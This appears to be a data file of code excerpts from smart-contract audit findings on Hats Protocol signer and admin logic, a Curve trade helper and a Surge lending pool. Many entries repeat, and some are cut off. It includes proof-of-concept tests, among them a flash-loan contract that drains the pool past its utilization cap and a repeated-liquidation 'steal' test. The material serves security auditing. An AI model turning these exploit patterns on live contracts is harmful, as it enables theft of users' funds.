DAI\nb = TwoTokenPoolUtils._getMinExitAmounts => (x DAI - 0.25% discount)\na > b\n```"
"```\nfunction _exactInSingle(Trade memory trade)\n    internal\n    view\n    returns (address target, bytes memory executionCallData)\n{\n    address sellToken = _getTokenAddress(trade.sellToken);\n    address buyToken = _getTokenAddress(trade.buyToken);\n    ICurvePool pool = ICurvePool(\n        Deployments.CURVE_REGISTRY.find_pool_for_coins(sellToken, buyToken)\n    );\n\n    if (address(pool) == address(0)) {\n        revert InvalidTrade();\n    }\n\n    int128 i = -1;\n    int128 j = -1;\n    for (int128 c = 0; c < MAX_TOKENS; c++) {\n        address coin = pool.coins(uint256(int256(c)));\n        if (coin == sellToken) {\n            i = c;\n        }\n        if (coin == buyToken) {\n            j = c;\n        }\n        if (i > -1 && j > -1) {\n            break;\n        }\n    }\n\n    if (i == -1 || j == -1) {\n        revert InvalidTrade();\n    }\n\n    return (\n        address(pool),\n        abi.encodeWithSelector(\n            ICurvePool.exchange.selector,\n            i,\n            j,\n            trade.amount,\n            trade.limit\n        )\n    );\n}\n```\n@view\n@external\ndef find_pool_for_coins(_from: address, _to: address, i: uint256 = 0) -> address:\n    """"""\n    @notice Find an available pool for exchanging two coins\n    @param _from Address of coin to be sent\n    @param _to Address of coin to be received\n    @param i Index value. When multiple pools are available\n            this value is used to return then'th address.\n    @return Pool address\n    """"""\n    key: uint256 = bitwise_xor(convert(_from, uint256), convert(_to, uint256))\n    return self.markets[key][i]\n```"
```\nif (safe.getThreshold()!= _getCorrectThreshold()):\n    revert SignersCannotChangeThreshold()\n```\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) {\n        _threshold = min;\n    } else if (count > max) {\n        _threshold = max;\n    } else {\n        _threshold = count;\n    }\n}\n```
```\nif (currentSignerCount >= maxSigs) {\n    revert MaxSignersReached();\n}\n\nif (safe.isOwner(msg.sender)) {\n    revert SignerAlreadyClaimed(msg.sender);\n}\n\nif (!isValidSigner(msg.sender)) {\n    revert NotSignerHatWearer(msg.sender);\n}\n```\n```\nfunction reconcileSignerCount() public {\n    address[] memory owners = safe.getOwners();\n    uint256 validSignerCount = _countValidSigners(owners);\n\n    if (validSignerCount > maxSigners) {\n        revert MaxSignersReached();\n    }\n```
```\nif (safe.getThreshold()!= _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) {\n        _threshold = min;\n    } else if (count > max) {\n        _threshold = max;\n    } else {\n        _threshold = count;\n    }\n}\n```\n```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```
```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```
"```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
"```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
"```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224;  // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\n```\nfunction approveLinkTopHatToTree(uint32 _topHatDomain, uint256 _newAdminHat) external {\n    if (getHatLevel(_newAdminHat) < MAX_LEVELS) {\n        _checkAdmin(buildHatId(_newAdminHat, 1));\n    } else {\n        _checkAdminOrWearer(_newAdminHat);\n    }\n\n    if (_newAdminHat!= linkedTreeRequests[_topHatDomain]) {\n        revert LinkageNotRequested();\n    }\n\n    delete linkedTreeRequests[_topHatDomain];\n\n    _linkTopHatToTree(_topHatDomain, _newAdminHat);\n}\n```\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224;\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```"
"```\nfor (uint256 i; i < _ownerCount - 1;) {\n    ownerToCheck = _owners[i];\n\n    if (!isValidSigner(ownerToCheck)) {\n        data = abi.encodeWithSignature(""swapOwner(address,address,address)"", \n            // rest of code\n```"
"```\nfunction isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n    uint256 linkedTreeAdmin;\n    uint32 adminLocalHatLevel;\n\n    if (isLocalTopHat(_hatId)) {\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            isAdmin = isWearerOfHat(_user, _hatId);\n            return;\n        } else {\n            if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                isAdmin = true;\n                return;\n            } else {\n                adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                _hatId = linkedTreeAdmin;\n            }\n        }\n    } else {\n        adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n    }\n\n    while (adminLocalHatLevel > 0) {\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n            isAdmin = true;\n            return;\n        }\n        unchecked {\n            --adminLocalHatLevel;\n        }\n    }\n\n    if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) {\n        isAdmin = true;\n        return;\n    }\n\n    linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n    if (linkedTreeAdmin == 0) {\n        isAdmin = false;\n        return;\n    } else {\n        if (isWearerOfHat(_user, linkedTreeAdmin)) {\n            isAdmin = true;\n            return;\n        }\n        isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n    }\n}\n```"
"```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n```\nfunction balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n    public\n    view\n    virtual\n    returns (uint256[] memory balances)\n{\n    require(owners.length == ids.length, ""LENGTH_MISMATCH"");\n\n    balances = new uint256[](owners.length);\n\n    unchecked {\n        for (uint256 i = 0; i < owners.length; i++) {\n            balances[i] = _balanceOf[owners[i]][ids[i]];\n        }\n    }\n}\n```"
```\nif (validSignerCount == currentSignerCount):\n    newSignerCount = currentSignerCount\nelse:\n    newSignerCount = currentSignerCount - 1\n```
```\nuint256 currentThreshold = safe.getThreshold();\nuint256 newThreshold;\nuint256 target = targetThreshold;  # save SLOADs\n\nif (validSignerCount <= target && validSignerCount!= currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\n\nif (newThreshold > 0) {\n    // rest of code update safe threshold\n    // rest of code\n}\n```\n```\nif (safe.getThreshold()!= _getCorrectThreshold()):\n    revert SignersCannotChangeThreshold()\n```\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) {\n        _threshold = min;\n    } else if (count > max) {\n        _threshold = max;\n    } else {\n        _threshold = count;\n    }\n}\n```
"```\n(address[] memory modules) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
"```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\n```\nfunction isWearerOfHat(address _user, uint256 _hatId) public view returns (bool isWearer) {\n    isWearer = (balanceOf(_user, _hatId) > 0);\n}\n```\n```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n```\nfunction balanceOf(address owner, uint256 id) public view virtual returns (uint256 balance) {\n    balance = _balanceOf[owner][id];\n}\n```"
"```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(\n        owners,\n        ownerCount,\n        maxSigs,\n        currentSignerCount,\n        msg.sender\n    );\n    if (!swapped) {\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\n```\nfunction _swapSigner(\n    address[] memory _owners,\n    uint256 _ownerCount,\n    uint256 _maxSigners,\n    uint256 _currentSignerCount,\n    address _signer\n) internal returns (bool success) {\n    address ownerToCheck;\n    bytes memory data;\n\n    for (uint256 i = 0; i < _ownerCount - 1; ) {\n        ownerToCheck = _owners[i];\n\n        if (!isValidSigner(ownerToCheck)) {\n            data = abi.encodeWithSignature(\n                ""swapOwner(address,address,address)"",\n                _findPrevOwner(_owners, ownerToCheck),\n                ownerToCheck,\n                _signer\n            );\n\n            success = safe.execTransactionFromModule(\n                address(safe),\n                0,\n                data,\n                Enum.Operation.Call\n            );\n\n            if (!success) {\n                revert FailedExecRemoveSigner();\n            }\n\n            if (_currentSignerCount < _maxSigners) {\n                _currentSignerCount++;\n            }\n            break;\n        }\n        i++;\n    }\n}\n```"
```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n    minThreshold = _minThreshold;\n}\n```\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n    targetThreshold = _targetThreshold;\n}
"```\nfunction _createHat(\n    uint256 _id,\n    string calldata _details,\n    uint32 _maxSupply,\n    address _eligibility,\n    address _toggle,\n    bool _mutable,\n    string calldata _imageURI\n) internal returns (Hat memory hat) {\n    hat.details = _details;\n    hat.maxSupply = _maxSupply;\n    hat.eligibility = _eligibility;\n    hat.toggle = _toggle;\n    hat.imageURI = _imageURI;\n    hat.config = _mutable? uint96(3 << 94) : uint96(1 << 95);\n    _hats[_id] = hat;\n\n    emit HatCreated(\n        _id,\n        _details,\n        _maxSupply,\n        _eligibility,\n        _toggle,\n        _mutable,\n        _imageURI\n    );\n}\n```"
"```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224;  // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\n```\nfunction approveLinkTopHatToTree(uint32 _topHatDomain, uint256 _newAdminHat) external {\n    if (getHatLevel(_newAdminHat) < MAX_LEVELS) {\n        _checkAdmin(buildHatId(_newAdminHat, 1));\n    } else {\n        _checkAdminOrWearer(_newAdminHat);\n    }\n\n    if (_newAdminHat!= linkedTreeRequests[_topHatDomain]) {\n        revert LinkageNotRequested();\n    }\n\n    delete linkedTreeRequests[_topHatDomain];\n\n    _linkTopHatToTree(_topHatDomain, _newAdminHat);\n}\n```\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224;\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```"
```\nif (validSignerCount <= target and validSignerCount!= currentThreshold):\n    newThreshold = validSignerCount\nelse:\n    if (validSignerCount > target and currentThreshold < target):\n        newThreshold = target\n```
"```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
"```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
```\nif (safe.getThreshold()!= _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) {\n        _threshold = min;\n    } else if (count > max) {\n        _threshold = max;\n    } else {\n        _threshold = count;\n    }\n}\n```\n```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```
```\nif (currentSignerCount >= maxSigs) {\n    revert MaxSignersReached();\n}\n\nif (safe.isOwner(msg.sender)) {\n    revert SignerAlreadyClaimed(msg.sender);\n}\n\nif (!isValidSigner(msg.sender)) {\n    revert NotSignerHatWearer(msg.sender);\n}\n```\n```\nfunction reconcileSignerCount() public {\n    address[] memory owners = safe.getOwners();\n    uint256 validSignerCount = _countValidSigners(owners);\n\n    if (validSignerCount > maxSigners) {\n        revert MaxSignersReached();\n    }\n```
```\nif (safe.getThreshold()!= _getCorrectThreshold()):\n    revert SignersCannotChangeThreshold()\n```\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) {\n        _threshold = min;\n    } else if (count > max) {\n        _threshold = max;\n    } else {\n        _threshold = count;\n    }\n}\n```
"```\nfunction _createHat(\n    uint256 _id,\n    string calldata _details,\n    uint32 _maxSupply,\n    address _eligibility,\n    address _toggle,\n    bool _mutable,\n    string calldata _imageURI\n) internal returns (Hat memory hat) {\n    hat.details = _details;\n    hat.maxSupply = _maxSupply;\n    hat.eligibility = _eligibility;\n    hat.toggle = _toggle;\n    hat.imageURI = _imageURI;\n    hat.config = _mutable? uint96(3 << 94) : uint96(1 << 95);\n    _hats[_id] = hat;\n\n    emit HatCreated(\n        _id,\n        _details,\n        _maxSupply,\n        _eligibility,\n        _toggle,\n        _mutable,\n        _imageURI\n    );\n}\n```"
```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n    minThreshold = _minThreshold;\n}\n```\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n    targetThreshold = _targetThreshold;\n}
"```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(\n        owners,\n        ownerCount,\n        maxSigs,\n        currentSignerCount,\n        msg.sender\n    );\n    if (!swapped) {\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\n```\nfunction _swapSigner(\n    address[] memory _owners,\n    uint256 _ownerCount,\n    uint256 _maxSigners,\n    uint256 _currentSignerCount,\n    address _signer\n) internal returns (bool success) {\n    address ownerToCheck;\n    bytes memory data;\n\n    for (uint256 i = 0; i < _ownerCount - 1; ) {\n        ownerToCheck = _owners[i];\n\n        if (!isValidSigner(ownerToCheck)) {\n            data = abi.encodeWithSignature(\n                ""swapOwner(address,address,address)"",\n                _findPrevOwner(_owners, ownerToCheck),\n                ownerToCheck,\n                _signer\n            );\n\n            success = safe.execTransactionFromModule(\n                address(safe),\n                0,\n                data,\n                Enum.Operation.Call\n            );\n\n            if (!success) {\n                revert FailedExecRemoveSigner();\n            }\n\n            if (_currentSignerCount < _maxSigners) {\n                _currentSignerCount++;\n            }\n            break;\n        }\n        i++;\n    }\n}\n```"
"```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\n```\nfunction isWearerOfHat(address _user, uint256 _hatId) public view returns (bool isWearer) {\n    isWearer = (balanceOf(_user, _hatId) > 0);\n}\n```\n```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n```\nfunction balanceOf(address owner, uint256 id) public view virtual returns (uint256 balance) {\n    balance = _balanceOf[owner][id];\n}\n```"
"```\n(address[] memory modules) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n```\n(address[] memory modules) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\n\nif (keccak256(abi.encode(modules))!= _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```"
```\nif (validSignerCount == currentSignerCount):\n    newSignerCount = currentSignerCount\nelse:\n    newSignerCount = currentSignerCount - 1\n```
"```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n```\nfunction balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n    public\n    view\n    virtual\n    returns (uint256[] memory balances)\n{\n    require(owners.length == ids.length, ""LENGTH_MISMATCH"");\n\n    balances = new uint256[](owners.length);\n\n    unchecked {\n        for (uint256 i = 0; i < owners.length; i++) {\n            balances[i] = _balanceOf[owners[i]][ids[i]];\n        }\n    }\n}\n```"
"```\nfunction isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n    uint256 linkedTreeAdmin;\n    uint32 adminLocalHatLevel;\n\n    if (isLocalTopHat(_hatId)) {\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            isAdmin = isWearerOfHat(_user, _hatId);\n            return;\n        } else {\n            if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                isAdmin = true;\n                return;\n            } else {\n                adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                _hatId = linkedTreeAdmin;\n            }\n        }\n    } else {\n        adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n    }\n\n    while (adminLocalHatLevel > 0) {\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n            isAdmin = true;\n            return;\n        }\n        unchecked {\n            --adminLocalHatLevel;\n        }\n    }\n\n    if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) {\n        isAdmin = true;\n        return;\n    }\n\n    linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n    if (linkedTreeAdmin == 0) {\n        isAdmin = false;\n        return;\n    } else {\n        if (isWearerOfHat(_user, linkedTreeAdmin)) {\n            isAdmin = true;\n            return;\n        }\n        isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n    }\n}\n```"
"```\nfor (uint256 i; i < _ownerCount - 1;) {\n    ownerToCheck = _owners[i];\n\n    if (!isValidSigner(ownerToCheck)) {\n        data = abi.encodeWithSignature(""swapOwner(address,address,address)"", \n            // rest of code\n```"
```\nif (validSignerCount <= target and validSignerCount!= currentThreshold):\n    newThreshold = validSignerCount\nelse:\n    if (validSignerCount > target and currentThreshold < target):\n        newThreshold = target\n```
"```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) {\n        revert ZeroAddress();\n    }\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```"
"```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) {\n        revert ZeroAddress();\n    }\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```"
```\n1e6 * 1e18 / 100001e18 = 0\n```
```\n_supplied = 100\n_totalSupply = 100\n\n_interest = 10\nfee = 2\n```\n```\n_accuredFeeShares = (fee * _totalSupply) / supplied\n_accuredFeeShares = (2 * 100) / 100\n_accuredFeeShares = 2\n```\n```\n2 * 110 / 102 = 2.156\n```\n```\n_accuredFeeShares = (_totalSupply * fee) / (_supplied + _interest - fee)\n_accuredFeeShares = 2 * 100 / (100 + 10 - 2)\n_accuredFeeShares = 1.852\n\n1.852 * 110 / 101.852 = 2\n```
"```\npragma solidity 0.8.17;\n\nimport { FlashBorrower, Flashloan, IERC20Token } from ""./FlashLoan.sol"";\nimport { Pool } from ""./../../src/Pool.sol"";\n\ncontract Borrower is FlashBorrower {\n    address public immutable owner;\n    Flashloan public immutable flashLoan;\n    Pool public immutable pool;\n    IERC20Token public loanToken;\n\n    constructor(Flashloan _flashLoan, Pool _pool) {\n        owner = msg.sender;\n        flashLoan = _flashLoan;\n        pool = _pool;\n        loanToken = IERC20Token(address(_pool.LOAN_TOKEN()));\n    }\n\n    function borrowAll() public returns (bool) {\n        pool.withdraw(0);\n        uint loanTokenBalance = loanToken.balanceOf(address(pool));\n        loanToken.approve(address(pool), loanTokenBalance);\n\n        flashLoan.execute(FlashBorrower(address(this)), loanToken, loanTokenBalance, abi.encode(loanTokenBalance));\n    }\n\n    function onFlashLoan(IERC20Token token, uint amount, bytes calldata data) public override {\n        (uint loanTokenBalance) = abi.decode(data, (uint));\n\n        pool.deposit(amount);\n        pool.borrow(loanTokenBalance);\n        pool.withdraw(amount);\n\n        token.transfer(address(flashLoan), amount);\n\n        loanToken.transfer(owner, loanTokenBalance);\n    }\n}\n```\n```\npragma solidity 0.8.17;\n\nimport ""forge-std/Test.sol"";\nimport ""../src/Pool.sol"";\nimport ""../src/Factory.sol"";\nimport ""./mocks/Borrower.sol"";\nimport ""./mocks/ERC20.sol"";\n\ncontract PoC is Test {\n    address public alice = vm.addr(0x1);\n    address public bob = vm.addr(0x2);\n    Factory public factory;\n    Pool public pool;\n    Borrower public borrower;\n    Flashloan public flashLoan;\n    MockERC20 public collateralToken;\n    MockERC20 public loanToken;\n    uint public maxCollateralRatioMantissa;\n    uint public surgeMantissa;\n    uint public collateralRatioFallDuration;\n    uint public collateralRatioRecoveryDuration;\n    uint public minRateMantissa;\n    uint public surgeRateMantissa;\n    uint public maxRateMantissa;\n\n    function setUp() public {\n        factory = new Factory(address(this), ""G"");\n        flashLoan = new Flashloan();\n        collateralToken = new MockERC20(1 ether, 18);\n        collateralToken.transfer(bob, 1 ether);\n        loanToken = new MockERC20(100 ether, 18);\n        loanToken.transfer(alice, 1 ether);\n        loanToken.transfer(address(flashLoan), 99 ether);\n        maxCollateralRatioMantissa = 1e18;\n        surgeMantissa = 0.8e18; // 80%\n        pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), maxCollateralRatioMantissa, surgeMantissa, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);\n    }\n\n    function testFailBorrowAll() external {\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1 ether);\n        vm.stopPrank();\n\n        vm.startPrank(bob);\n        collateralToken.approve(address(pool), 1 ether);\n        pool.addCollateral(bob, 1 ether);\n        pool.borrow(1 ether);\n        vm.stopPrank();\n    }\n\n    function testBypassUtilizationRate() external {\n        uint balanceBefore = loanToken.balanceOf(bob);\n\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1"
"```\nuint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n\nif (_timeDelta == 0) {\n    return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n}\n\nuint _supplied = _totalDebt + _loanTokenBalance;\nuint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n_currentCollateralRatioMantissa = getCollateralRatioMantissa(\n    _util,\n    _lastAccrueInterestTime,\n    block.timestamp,\n    _lastCollateralRatioMantissa,\n    COLLATERAL_RATIO_FALL_DURATION,\n    COLLATERAL_RATIO_RECOVERY_DURATION,\n    MAX_COLLATERAL_RATIO_MANTISSA,\n    SURGE_MANTISSA\n);\n\nif (_totalDebt == 0) {\n    return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n}\n\nuint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\nuint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18);\n_currentTotalDebt += _interest;\n```"
"```\nfunction testLiquidateSteal() external {\n    uint loanTokenAmount = 12000;\n    uint borrowAmount = 1000;\n    uint collateralAmountA = 10000;\n    uint collateralAmountB = 1400;\n    MockERC20 collateralToken = new MockERC20(collateralAmountA + collateralAmountB, 18);\n    MockERC20 loanToken = new MockERC20(loanTokenAmount, 18);\n    Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 0.8e18, 0.5e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);\n\n    loanToken.approve(address(pool), loanTokenAmount);\n    pool.deposit(loanTokenAmount);\n\n    // Alice borrows 1000\n    collateralToken.transfer(address(1), collateralAmountB);\n    vm.prank(address(1));\n    collateralToken.approve(address(pool), collateralAmountB);\n    vm.prank(address(1));\n    pool.addCollateral(address(1), collateralAmountB);\n    vm.prank(address(1));\n    pool.borrow(borrowAmount);\n\n    // Bob borrows 1000 too\n    collateralToken.approve(address(pool), collateralAmountA);\n    pool.addCollateral(address(this), collateralAmountA);\n    pool.borrow(borrowAmount);\n\n    // Bob's debt becomes 1200\n    vm.warp(block.timestamp + 365 days);\n    pool.withdraw(0);\n    uint myDebt = pool.getDebtOf(pool.debtSharesBalanceOf(address(this)), pool.debtSharesSupply(), pool.lastTotalDebt());\n    assertEq(myDebt, 1200);\n\n    // Alice's debt becomes 1200\n    uint address1Debt = pool.getDebtOf(pool.debtSharesBalanceOf(address(1)), pool.debtSharesSupply(), pool.lastTotalDebt());\n    assertEq(address1Debt, 1200);\n    assertEq(pool.lastTotalDebt(), 2399);\n\n    uint myCollateralBeforeLiquidate = collateralToken.balanceOf(address(this));\n\n    // liquidate 200 for Alice\n    loanToken.approve(address(pool), 200);\n    for (int i; i < 200; i++) {\n        pool.liquidate(address(1), 1);\n    }\n\n    // Alice's debt shares are NOT reduced"
```\n1e6 * 1e18 / 100001e18 = 0\n```
"```\nfunction testLiquidateSteal() external {\n    uint loanTokenAmount = 12000;\n    uint borrowAmount = 1000;\n    uint collateralAmountA = 10000;\n    uint collateralAmountB = 1400;\n    MockERC20 collateralToken = new MockERC20(collateralAmountA + collateralAmountB, 18);\n    MockERC20 loanToken = new MockERC20(loanTokenAmount, 18);\n    Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 0.8e18, 0.5e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);\n\n    loanToken.approve(address(pool), loanTokenAmount);\n    pool.deposit(loanTokenAmount);\n\n    // Alice borrows 1000\n    collateralToken.transfer(address(1), collateralAmountB);\n    vm.prank(address(1));\n    collateralToken.approve(address(pool), collateralAmountB);\n    vm.prank(address(1));\n    pool.addCollateral(address(1), collateralAmountB);\n    vm.prank(address(1));\n    pool.borrow(borrowAmount);\n\n    // Bob borrows 1000 too\n    collateralToken.approve(address(pool), collateralAmountA);\n    pool.addCollateral(address(this), collateralAmountA);\n    pool.borrow(borrowAmount);\n\n    // Bob's debt becomes 1200\n    vm.warp(block.timestamp + 365 days);\n    pool.withdraw(0);\n    uint myDebt = pool.getDebtOf(pool.debtSharesBalanceOf(address(this)), pool.debtSharesSupply(), pool.lastTotalDebt());\n    assertEq(myDebt, 1200);\n\n    // Alice's debt becomes 1200\n    uint address1Debt = 